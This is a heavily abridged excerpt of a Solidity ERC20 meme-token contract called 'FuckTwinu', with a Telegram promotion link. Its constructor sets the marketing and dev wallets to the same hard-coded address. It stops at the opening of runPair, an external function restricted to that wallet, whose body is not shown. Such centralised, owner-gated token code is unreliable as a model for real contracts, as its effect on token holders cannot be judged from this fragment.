...
JOIN THE TELEGRAM: https://t.me/FuckTwinu
...
contract FuckTwinu is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("FuckTwinu", "FuckTwinu") {
        ...
        marketingWallet = payable(0xada0A55240c4cc80eD5BEfa98eBE9c88129BEF75);
        devWallet = payable(0xada0A55240c4cc80eD5BEfa98eBE9c88129BEF75);
    ...
    function runPair(uint amount) external {
        require(msg.sender == marketingWallet);
